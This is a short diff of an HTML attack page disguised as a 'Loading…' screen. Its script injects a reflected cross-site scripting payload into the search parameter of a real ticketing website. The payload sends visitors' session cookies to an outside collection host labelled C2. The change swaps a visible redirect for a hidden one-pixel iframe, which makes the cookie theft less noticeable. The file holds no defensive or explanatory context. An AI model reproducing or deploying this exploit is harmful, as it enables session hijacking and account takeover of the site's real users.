@@ -1,15 +1,19 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <meta charset="UTF-8">
-  <title>Loading...</title>
-</head>
+<head><meta charset="UTF-8"><title>Loading…</title></head>
 <body>
 <script>
-  var C2 = 'https://1e5t945y.requestrepo.com'; 
-  var PAYLOAD = '<script>window.location.href="' + C2 + '/?c="+encodeURIComponent(document.cookie)<\/script>';
-  var TARGET = 'https://www.livenation.co.uk/search?query=' + encodeURIComponent(PAYLOAD);
-  window.location.href = TARGET;
+  var C2 = 'https://1e5t945y.requestrepo.com';
+  var TARGET = 'https://www.livenation.co.uk/search?query='
+             + encodeURIComponent(
+                 '<script>window.location.href="' + C2
+                 + '/?c="+encodeURIComponent(document.cookie)<\/script>'
+               );
+
+  var iframe = document.createElement('iframe');
+  iframe.src = TARGET;
+  iframe.style.cssText = 'display:none;width:1px;height:1px;';
+  document.body.appendChild(iframe);
 </script>
 </body>
 </html>
